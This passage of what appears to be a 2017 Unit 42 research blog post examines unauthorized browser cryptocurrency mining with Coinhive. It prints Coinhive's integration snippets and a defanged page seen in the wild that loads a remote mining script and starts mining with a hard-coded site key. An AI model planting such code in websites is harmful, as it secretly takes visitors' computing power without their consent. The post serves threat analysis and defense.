<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/"><img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" /></a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-98931" class="menu-item menu-item-type-post_type_archive menu-item-object-events menu-item-98931"><a href="https://unit42.paloaltonetworks.com/events/">Speaking Events</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>

  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">Unauthorized Coin Mining in the Browser</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-46044 entry-meta">
			
			
			<span class="post-views-count">55,025</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'46044','like')"><i class="ui ui-2"></i><span class="ml-5">2</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 10</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-unauthorized-coin-mining-browser%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/home?status=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-unauthorized-coin-mining-browser%2F+-+Unauthorized+Coin+Mining+in+the+Browser" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-unauthorized-coin-mining-browser%2F&title=Unauthorized+Coin+Mining+in+the+Browser&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/unit42-unauthorized-coin-mining-browser/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/wei-xu/" title="Posts by Wei Xu" class="author url fn" rel="author">Wei Xu</a>, <a href="https://unit42.paloaltonetworks.com/author/yuchen-zhou/" title="Posts by Yuchen Zhou" class="author url fn" rel="author">Yuchen Zhou</a>, <a href="https://unit42.paloaltonetworks.com/author/wayne-xin/" title="Posts by Wayne Xin" class="author url fn" rel="author">Wayne Xin</a> and <a href="https://unit42.paloaltonetworks.com/author/jun-j-wang/" title="Posts by Jun Javier Wang" class="author url fn" rel="author">Jun Javier Wang</a>        </p>
        <p><time datetime="2017-10-17T17:00:07+00:00">October 17, 2017 at 10:00 AM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/unit42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/bitcoin/" rel="tag">Bitcoin</a>, <a href="https://unit42.paloaltonetworks.com/tag/coinhive/" rel="tag">Coinhive</a>, <a href="https://unit42.paloaltonetworks.com/tag/cryptocurrency/" rel="tag">Cryptocurrency</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                      <figure class="mb-30 text-center">
              <img width="650" height="300" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" class="attachment-single size-single wp-post-image" alt="" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg 650w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300-300x138.jpg 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300-370x171.jpg 370w" sizes="(max-width: 650px) 100vw, 650px" />            </figure>
                    <p>Cryptocurrencies have taken the world by storm. From the biggest player Bitcoin to newcomers such as Monero and Ethereum, cryptocurrency mining has become a hot industry due in part to powerful, dedicated mining hardware or by utilizing graphics cards’ parallel computing power. Recently, browser coin mining has taken off, for a lot of different reasons. Although the computing power per instance is much less than dedicated hardware provides, being able to utilize many users on various sites more than make up for it. There is  already some media coverage on this, such as <a href="http://www.bbc.com/news/technology-41518351">BBC</a>, and <a href="https://malwaretips.com/blogs/remove-coinhive-miner-virus/">malwarebytes</a>. While we do not consider crypto-currency mining inside browsers malicious by itself, often such mining is going on without the end user’s consent or even knowledge that makes this practice shady and despicable.</p>
<p><a href="http://coinhive.com/">Coinhive</a>, one of the more popular browser-mining services out there offers site owners a piece of JavaScript for easy integration. Site owners use site visitors’ CPU time to mine XMRs (Moneros) for Coinhive, and Coinhive pays out 70% of mined value to site owners. A new player, <a href="https://paloaltonetworks.sharepoint.com/sites/u42/Shared%20Documents/Publishing/Draft/crypto-loot.com">crypto-loot</a>  emerged recently which offers similar services but pays out 88% of revenue.</p>
<h2></h2>
<h2>Coinhive Integration</h2>
<p class="FirstParagraph">On the official Coinhive homepage, we found detailed documentation on how to integrate the mining scripts onto any given website. Owners can use the easy version:</p>
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f6928803d900454983552" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
var miner = new CoinHive.Anonymous('YOUR_SITE_KEY');
miner.start();</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f6928803d900454983552-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928803d900454983552-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f6928803d900454983552-1"><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">miner</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-v">CoinHive</span><span class="crayon-sy">.</span><span class="crayon-e">Anonymous</span><span class="crayon-sy">(</span><span class="crayon-s">'YOUR_SITE_KEY'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928803d900454983552-2"><span class="crayon-v">miner</span><span class="crayon-sy">.</span><span class="crayon-e">start</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>or more complicated version that gives control over how the end user&#8217;s CPU time should be used, e.g. how many threads, should the mining throttle.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f6928803d907448962064" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
var miner = new CoinHive.User('YOUR_SITE_KEY', 'john-doe', {
    threads: 4,
    autoThreads: false,
    throttle: 0.8,
    forceASMJS: false
});</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f6928803d907448962064-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928803d907448962064-2">2</div><div class="crayon-num" data-line="crayon-5f6928803d907448962064-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928803d907448962064-4">4</div><div class="crayon-num" data-line="crayon-5f6928803d907448962064-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928803d907448962064-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f6928803d907448962064-1"><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">miner</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-v">CoinHive</span><span class="crayon-sy">.</span><span class="crayon-e">User</span><span class="crayon-sy">(</span><span class="crayon-s">'YOUR_SITE_KEY'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'john-doe'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928803d907448962064-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">threads</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">4</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-5f6928803d907448962064-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">autoThreads</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928803d907448962064-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">throttle</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">0.8</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-5f6928803d907448962064-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">forceASMJS</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">false</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928803d907448962064-6"><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p>Higher thread number and/or lower throttle number will result in more CPU usage in client&#8217;s browser. With higher CPU occupation percentage, end users will likely experience sluggish behavior and poor experience on the websites.</p>
<h2></h2>
<h2>Tracking Coinhive Integrations</h2>
<p>We have been tracking the inclusion of Coinhive mining script (coinhive.min.js) for a week in our PANDB unknown feed. The number of URLs leading to the download of such similar scripts is astounding. Since we started tracking, we have seen anywhere from 6K unique URLs to over 10K in one single day.</p>
<p>Overall, we have seen over 35,119 unique URLs associated with coinhive.min.js. Across these URLs, there are a total of 144 IPs and 1,025 hostnames. Based on our observation, the appearance of these scripts can be clearly divided into three categories – standalone, voluntary, and compromised.</p>
<h2></h2>
<h2>Standalone Hosting</h2>
<p class="FirstParagraph">URLs like this one,</p>
<p class="SourceCode" style="text-align: left;"><span class="VerbatimChar" style="font-family: 'courier new', courier, monospace;">hxxp://gkiqfnjtwmj[.]bid/vhyk.php%3fr=1507428652%26v=3%26ilznfamx=1322781%26zptrfkmy=%26djpsicdr=%26adymouss=%26ruxhztvq=http://cricfree[.]cc/stream2watch/bt2.php%26s=1536%2c864%2c1.83%2c2810.88%2c1581.1200000000001</span></p>
<p class="FirstParagraph">always hosts the following content:</p>
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f6928803d909686566629" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;html&gt;
    &lt;body&gt;
        &lt;script&gt;
            var mnr = document.createElement('script');
            mnr.src = 'https://coin-hive[.]com/lib/coinhive.min.js';
            mnr.onload=function(){
                var miner=CoinHive.Anonymous('T3z562MP2Zg1lIa7RUJy19d67woeZmJJ');
                miner.start();
            };
            document.getElementsByTagName('body')[0].appendChild(mnr);
        &lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f6928803d909686566629-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928803d909686566629-2">2</div><div class="crayon-num" data-line="crayon-5f6928803d909686566629-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928803d909686566629-4">4</div><div class="crayon-num" data-line="crayon-5f6928803d909686566629-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928803d909686566629-6">6</div><div class="crayon-num" data-line="crayon-5f6928803d909686566629-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928803d909686566629-8">8</div><div class="crayon-num" data-line="crayon-5f6928803d909686566629-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928803d909686566629-10">10</div><div class="crayon-num" data-line="crayon-5f6928803d909686566629-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928803d909686566629-12">12</div><div class="crayon-num" data-line="crayon-5f6928803d909686566629-13">13</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f6928803d909686566629-1"><span class="crayon-o">&lt;</span><span class="crayon-e">html</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928803d909686566629-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">body</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-5f6928803d909686566629-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-ta">&lt;script&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928803d909686566629-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">mnr</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-e">createElement</span><span class="crayon-sy">(</span><span class="crayon-s">'script'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f6928803d909686566629-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">mnr</span><span class="crayon-sy">.</span><span class="crayon-e ">src</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'https://coin-hive[.]com/lib/coinhive.min.js'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928803d909686566629-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">mnr</span><span class="crayon-sy">.</span><span class="crayon-v">onload</span><span class="crayon-o">=</span><span class="crayon-t">function</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f6928803d909686566629-7"><span 